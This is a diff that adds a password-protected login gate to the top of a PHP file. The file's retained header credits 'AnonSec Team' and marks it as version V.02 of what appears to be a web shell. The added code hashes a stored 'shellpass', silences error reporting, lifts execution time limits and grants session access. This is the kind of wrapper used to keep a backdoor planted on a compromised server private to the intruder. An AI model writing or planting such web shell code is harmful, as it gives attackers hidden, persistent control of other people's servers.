@@ -1,4 +1,55 @@
- <?php
+<?php
+
+$shellpass = "7f41aa189d28db14692557c2c9d984ec";
+
+session_start();
+
+@error_reporting(0);
+
+@set_time_limit(0);
+
+function Login() {
+
+?>
+
+<html>
+
+<head>
+
+</style>
+
+<center>
+
+<form method="post">
+
+<font face ='comic sans ms' size='3' color='black'>Password :
+
+<input type="password" name="pass">
+
+	<input type="submit" value="Login">
+</form>
+
+
+
+<?php
+
+exit;
+
+}
+
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+
+    if( empty($shellpass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $shellpass) ) )
+
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+
+    else
+
+        Login();
+
+?>
+
+<?php
 /*	~ Mau recode? izin dulu, recode ga izin itu ga keren ajg
 	~ V.02
 	~ Thanks to all mem AnonSec Team and all friend.
